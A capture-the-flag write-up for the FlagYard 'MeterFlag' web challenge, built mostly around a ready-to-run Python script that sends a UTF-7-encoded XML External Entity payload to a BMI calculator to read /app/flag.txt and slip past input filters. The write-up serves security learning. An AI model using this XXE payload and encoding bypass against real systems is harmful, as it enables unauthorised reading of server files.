# Meters Flag Challenge (80 Points)

## Challenge Overview

This writeup provides an automated solution to the **"MeterFlag"** challenge, which is worth 80 points in the **web category** on the FlagYard platform. The challenge involves exploiting an **XML External Entity (XXE)** vulnerability to retrieve a sensitive file (`/app/flag.txt`) from the server using **UTF-7 encoding** to bypass security restrictions.

The Python script included here automates this process, enabling the exploitation of the XXE vulnerability by encoding the malicious payload in UTF-7 and retrieving the flag from the target server.

## Vulnerability

The target application is a **BMI calculator** that accepts user inputs in XML format. Upon reviewing the request, it becomes clear that the server might be vulnerable to an **XXE (XML External Entity)** injection, allowing us to attempt retrieving sensitive files from the server, such as the `flag.txt` file.

### Payload Strategy

To exploit this vulnerability, we will:
1. Inject a crafted XML payload that includes an external entity pointing to the file we want to access.
2. Encode the payload in **UTF-7** to bypass server-side filters.
3. Send the payload via a **POST** request to the application.
4. Capture and print the contents of the file (i.e., the flag) returned by the server.

## Exploit Automation

The following Python script automates this entire process, making it simple to exploit the vulnerability by just providing the base URL of the target application.

### Python Script

```python
import requests
import sys


def exploit_xxe(base_url):
    # Step 1: Prepare the original XXE payload
    original_payload = """<!DOCTYPE data [
      <!ENTITY xxe SYSTEM "/app/flag.txt">
    ]>
    <data>
      <weight>&xxe;</weight>
      <height>170</height>
    </data>"""

    print("[+] Original XXE Payload:")
    print(original_payload)

    # Step 2: Encode the payload in UTF-7
    utf7_payload = """<?xml version="1.0" encoding="UTF-7"?>
    +ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///app/flag.txt+ACI-+AD4-+ACA-+AF0-+AD4-+AA0-+AAo-
    +ADw-data+AD4-+ADw-weight+AD4-+ACY-xxe+ADs-+ADw-/weight+AD4-+ADw-height+AD4-170+ADw-/height+AD4-+ADw-/data+AD4-"""
    print("[+] UTF-7 encoded XXE Payload:")
    print(utf7_payload)
    # Step 3: Set headers for the request
    headers = {
        'Content-Type': 'application/xml',  # Since it's XML data
    }

    # Step 4: Send the request to the target URL
    target_url = f"{base_url}"

    print(f"[+] Sending XXE payload to {target_url}...")

    # Step 5: Send the UTF-7 encoded payload as a POST request
    response = requests.post(target_url, headers=headers, data=utf7_payload)

    # Step 6: Check the response for the flag
    if response.status_code == 200:
        print("[+] Exploit successful! Flag retrieved:")
        print(response.text)
    else:
        print(
            f"[-] Failed to retrieve the flag. Status Code: {response.status_code}")
        print(response.text)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_xxe.py <base_url>")
        sys.exit(1)

    base_url = sys.argv[1]
    exploit_xxe(base_url)
```

### Steps for Running the Script:

1. **Pre-requisites**: Ensure you have Python 3 and the `requests` library installed.
   - Install `requests` by running:
     ```bash
     pip install requests
     ```

2. **Save the Script**: Save the script to a file, e.g., `exploit_xxe.py`.

3. **Run the Script**: Execute the script with the target URL as a parameter.
   ```bash
   python exploit_xxe.py http://target-bmi-calculator.com
   ```

4. **Flag Retrieval**: If the server is vulnerable, the script will display the contents of the `flag.txt` file, i.e., the flag for the challenge.

## Key Concepts in the Script

### 1. **XXE Injection**
The script uses **XML External Entity (XXE)** injection to load an external file on the server (`/app/flag.txt`). The payload defines a `SYSTEM` entity that references the file location.

### 2. **UTF-7 Encoding**
The payload is encoded in **UTF-7** to evade potential filters or protections that may prevent standard XXE payloads from being processed. This encoding method allows us to sneak the malicious payload past basic XML validation.

### 3. **Automating Exploitation**
The script automates the process of sending the encoded XML payload to the target server using a **POST** request with the appropriate headers and payload, then retrieves and prints the server’s response.

## Conclusion

This script provides a fast and efficient way to exploit the **XXE vulnerability** in the **MeterFlag** challenge on FlagYard, worth 80 points. By automating the injection process and using **UTF-7** encoding to bypass security, the flag can be retrieved with minimal effort.
